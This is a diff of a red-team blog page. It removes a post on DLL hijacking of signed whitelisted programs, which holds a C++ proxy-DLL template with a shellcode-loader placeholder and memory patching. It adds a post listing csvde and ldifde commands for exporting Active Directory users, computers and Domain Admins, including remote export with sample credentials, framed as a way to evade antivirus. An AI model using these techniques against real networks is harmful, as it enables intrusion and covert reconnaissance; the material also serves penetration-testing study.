@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="DLL hijacking the whitelist application online, Yangsir">
+    <meta name="keywords" content="Supplementary information about obtaining LDAP information, Yangsir">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>DLL hijacking the whitelist application online | Yangsir</title>
+    <title>Supplementary information about obtaining LDAP information | Yangsir</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152525595.png')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">DLL hijacking the whitelist application online</h1>
+                    <h1 class="description center-align post-title">Supplementary information about obtaining LDAP information</h1>
                 </div>
             </div>
         </div>
@@ -440,6 +440,10 @@
                                 <span class="chip bg-color">Bypass</span>
                             </a>
                         
+                            <a href="/tags/Intranet-Information-Collection/">
+                                <span class="chip bg-color">Intranet Information Collection</span>
+                            </a>
+                        
                     </div>
                     
                 </div>
@@ -448,8 +452,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Learning-record/" class="post-category">
-                                Learning record
+                            <a href="/categories/Essays-record/" class="post-category">
+                                Essays record
                             </a>
                         
                     </div>
@@ -461,7 +465,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>Publish Date:&nbsp;&nbsp;
-                    2021-07-20
+                    2021-07-23
                 </div>
                 
 
@@ -470,7 +474,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>Word Count:&nbsp;&nbsp;
-                    469
+                    474
                 </div>
                 
 
@@ -500,167 +504,78 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Application EXE unsigned white program, call their own compiled black DLL, here to QQ housekeeper function as a case, the implementation of the source code is as follows</p>
-<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">extern &quot;C&quot; __declspec(dllexport) void test();
+                <h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">The project encountered a pit point, some complement, the method of obtaining information to complement, in order to better bypass AV<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
 
-DWORD WINAPI DDOS(LPVOID lpParameter)
-&#123;
-	your shellcode loader
-&#125;
+<h2 id="csvde"><a href="#csvde" class="headerlink" title="csvde"></a>csvde</h2><pre class="line-numbers language-none"><code class="language-none">The target information is exported, and the output product is in CSV format. The actual Chinese exported will have garbled characters
 
-static
-HMODULE g_OldModule &#x3D; NULL;
+Main applicable versions:
+Windows Server 2003, Windows Server 2008, Windows Server 2003 R2, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8
 
-VOID WINAPI Free()
-&#123;
-	if (g_OldModule)
-	&#123;
-		FreeLibrary(g_OldModule);
-	&#125;
-&#125;
+Operation Manual:
+https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-r2-and-2012&#x2F;cc732101(v&#x3D;ws.11)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h3 id="Actual-use"><a href="#Actual-use" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">All information in the domain:
+csvde -f 1.csv
 
-BOOL WINAPI Load()
-&#123;
-	TCHAR tzPath[MAX_PATH];
-	TCHAR tzTemp[MAX_PATH * 2];
+Information about all users in the domain:
+csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot;
 
+Information about all machines in the domain:
+csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot;
 
-	&#x2F;&#x2F;GetModuleFileName(NULL,tzPath,MAX_PATH); 
-	&#x2F;&#x2F;PathRemoveFileSpec(tzPath);
+Information about all groups in the domain:
+csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;group))&quot;
 
-	GetSystemDirectory(tzPath, MAX_PATH); 
+Information about all administrator groups in the domain:
+csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot;
 
-	lstrcat(tzPath, TEXT(&quot;\\dllname.dll&quot;));
+All OU information in the domain:
+csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot;
 
-	g_OldModule &#x3D; LoadLibrary(tzPath);
-	if (g_OldModule &#x3D;&#x3D; NULL)
-	&#123;
-		wsprintf(tzTemp, TEXT(&quot;无法找到模块 %s,程序无法正常运行&quot;), tzPath);
-		MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);
-	&#125;
+All domain user names in the domain:
+csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountName
 
-	return (g_OldModule !&#x3D; NULL);
+All computer names in the domain:
+csvde -f 1.csv -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l name
 
-&#125;
+Remote export:
+Csvde -s 192.168.3.144 -a rootkit.org\sqladmin Admin12345 -f all.csv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
+<h2 id="ldifde"><a href="#ldifde" class="headerlink" title="ldifde"></a>ldifde</h2><pre class="line-numbers language-none"><code class="language-none">Main applicable versions:
+Windows Server 2003, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, Windows Server 2003 with SP1, Windows 8
 
-FARPROC WINAPI GetAddress(PCSTR pszProcName)
-&#123;
-	FARPROC fpAddress;
-	CHAR szProcName[64];
-	TCHAR tzTemp[MAX_PATH];
+Operation Manual:
+https:&#x2F;&#x2F;docs.microsoft.com&#x2F;en-us&#x2F;previous-versions&#x2F;windows&#x2F;it-pro&#x2F;windows-server-2012-r2-and-2012&#x2F;cc731033(v&#x3D;ws.11)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-	fpAddress &#x3D; GetProcAddress(g_OldModule, pszProcName);
-	if (fpAddress &#x3D;&#x3D; NULL)
-	&#123;
-		if (HIWORD(pszProcName) &#x3D;&#x3D; 0)
-		&#123;
-			wsprintfA(szProcName, &quot;#%d&quot;, pszProcName);
-			pszProcName &#x3D; szProcName;
-		&#125;
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152525595.png" alt="image"></p>
+<h3 id="Actual-use-1"><a href="#Actual-use-1" class="headerlink" title="Actual use"></a>Actual use</h3><pre class="line-numbers language-none"><code class="language-none">All information in the domain:
+ldifde -f 2.txt
 
-		wsprintf(tzTemp, TEXT(&quot;无法找到函数 %hs,程序无法正常运行&quot;), pszProcName);
-		MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);
-		ExitProcess(-2);
-	&#125;
-	return fpAddress;
-&#125;
+Information about all users in the domain:
+ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -f 2.txt
 
-BOOL WINAPI Init()
-&#123;
-	pfnAheadLib_GetVgaAllInfo &#x3D; GetAddress(&quot;GetVgaAllInfo&quot;);
-	pfnAheadLib_GetVgaTemp &#x3D; GetAddress(&quot;GetVgaTemp&quot;);
-	return TRUE;
-&#125;
+Information about all machines in the domain:
+ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -f 2.txt
 
-DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)
-&#123;
-	HANDLE hProcess;
+Information about all groups in the domain:
+ldifde -r &quot;(&amp;(objectCategory&#x3D;group))&quot; -f 2.txt
 
-	PVOID addr1 &#x3D; reinterpret_cast&lt;PVOID&gt;(0x00401000);
-	BYTE data1[] &#x3D; &#123; 0x90, 0x90, 0x90, 0x90 &#125;;
+Information about all administrator groups in the domain:
+ldifde -r &quot;(&amp;(objectCategory&#x3D;group)(name&#x3D;Domain Admins))&quot; -f 2.txt
 
-	
-	hProcess &#x3D; OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());
-	if (hProcess)
-	&#123;
-		WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);
+All OU information in the domain:
+ldifde -r &quot;(&amp;(objectCategory&#x3D;organizationalUnit))&quot; -f 2.txt
 
-		CloseHandle(hProcess);
-	&#125;
+All domain user names in the domain:
+ldifde -r &quot;(&amp;(objectCategory&#x3D;person))&quot; -l SamAccountName -f 2.txt
 
-	return 0;
-&#125;
+All computer names in the domain:
+ldifde -r &quot;(&amp;(objectCategory&#x3D;computer))&quot; -l name -f 2.txt
 
+Remote export:
+Ldifde -s 192.168.3.144 -a rootkit.org\sqladmin Admin12345 -f 2.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
-BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)
-&#123;
-	HANDLE threadHandle;
-	threadHandle &#x3D; CreateThread(NULL, 0, DDOS, NULL, 0, NULL);
-	if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)
-	&#123;
-
-		DisableThreadLibraryCalls(hModule);
-
-		if (Load() &amp;&amp; Init())
-		&#123;
-			TCHAR szAppName[MAX_PATH] &#x3D; TEXT(&quot;MyApp.exe&quot;);
-			TCHAR szCurName[MAX_PATH];
-
-			GetModuleFileName(NULL, szCurName, MAX_PATH);
-			PathStripPath(szCurName);
-
-			
-			if (StrCmpI(szCurName, szAppName) &#x3D;&#x3D; 0)
-			&#123;
-				
-				HANDLE hThread &#x3D; CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);
-				if (hThread)
-				&#123;
-					CloseHandle(hThread);
-				&#125;
-			&#125;
-		&#125;
-	&#125;
-	else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)
-	&#123;
-		Free();
-	&#125;
-
-	return TRUE;
-&#125;
-
-EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaAllInfo(void)
-&#123;
-	__asm jmp pfnAheadLib_GetVgaAllInfo;
-&#125;
-
-EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaTemp(void)
-&#123;
-	__asm jmp pfnAheadLib_GetVgaTemp;
-&#125;
-
-void test()
-&#123;
-	MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, MB_OK);
-	HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;dllname.dll&quot;);
-	if (hDllInst)
-	&#123;
-		typedef DWORD(WINAPI *EXPFUNC)();
-		EXPFUNC exportFunc &#x3D; NULL;
-		exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);
-		if (exportFunc)
-		&#123;
-			exportFunc();
-		&#125;
-		FreeLibrary(hDllInst);
-	&#125;
-	return;
-&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<h2 id="Final-result"><a href="#Final-result" class="headerlink" title="Final result"></a>Final result</h2><p>Use the signed white program to call the black DLL successfully online the target machine</p>
-<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" alt="image"></p>
+<p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152733426.png" alt="image"></p>
 
                 
             </div>
@@ -687,7 +602,7 @@ void test()
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="https://yangsirrr.github.io/2021/07/20/dll-hijacking-the-whitelist-application-online/">https://yangsirrr.github.io/2021/07/20/dll-hijacking-the-whitelist-application-online/</a>
+                    <a href="https://yangsirrr.github.io/2021/07/23/supplementary-information-about-obtaining-ldap-information/">https://yangsirrr.github.io/2021/07/23/supplementary-information-about-obtaining-ldap-information/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -733,6 +648,10 @@ void test()
                                     <span class="chip bg-color">Bypass</span>
                                 </a>
                             
+                                <a href="/tags/Intranet-Information-Collection/">
+                                    <span class="chip bg-color">Intranet Information Collection</span>
+                                </a>
+                            
                         </div>
                     
                 </div>
@@ -776,17 +695,17 @@ void test()
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;Previous</div>
+                <i class="far fa-dot-circle"></i>&nbsp;Current
+            </div>
             <div class="card">
-                <a href="/2021/07/21/sensitive-path-information-concerns/">
+                <a href="/2021/07/23/supplementary-information-about-obtaining-ldap-information/">
                     <div class="card-image">
                         
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Supplementary%20information%20about%20obtaining%20LDAP%20information/image-20210722152525595.png" class="responsive-img" alt="Supplementary information about obtaining LDAP information">
                         
-                        <img src="/medias/featureimages/8.jpg" class="responsive-img" alt="Sensitive path information concerns">
-                        
-                        <span class="card-title">Sensitive path information concerns</span>
+                        <span class="card-title">Supplementary information about obtaining LDAP information</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -796,9 +715,9 @@ void test()
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-07-21
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-23
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -811,6 +730,7 @@ void test()
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -818,8 +738,12 @@ void test()
                         <span class="chip bg-color">Redteam</span>
                     </a>
                     
-                    <a href="/tags/Information-collection/">
-                        <span class="chip bg-color">Information collection</span>
+                    <a href="/tags/Bypass/">
+                        <span class="chip bg-color">Bypass</span>
+                    </a>
+                    
+                    <a href="/tags/Intranet-Information-Collection/">
+                        <span class="chip bg-color">Intranet Information Collection</span>
                     </a>
                     
                 </div>
@@ -833,12 +757,12 @@ void test()
                 Next&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/07/19/dll-hijacking-from-hijacking-to-on-line/">
+                <a href="/2021/07/23/xwizard-microsoft-program-use-white-and-black/">
                     <div class="card-image">
                         
-                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" class="responsive-img" alt="DLL hijacking from hijacking to on-line">
+                        <img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/Xwizard%20Microsoft%20program%20use%20white%20and%20black/image-20210723145815560.png" class="responsive-img" alt="Xwizard Microsoft program use white and black">
                         
-                        <span class="card-title">DLL hijacking from hijacking to on-line</span>
+                        <span class="card-title">Xwizard Microsoft program use white and black</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -849,7 +773,7 @@ void test()
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-19
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-23
                             </span>
                         <span class="publish-author">
                             
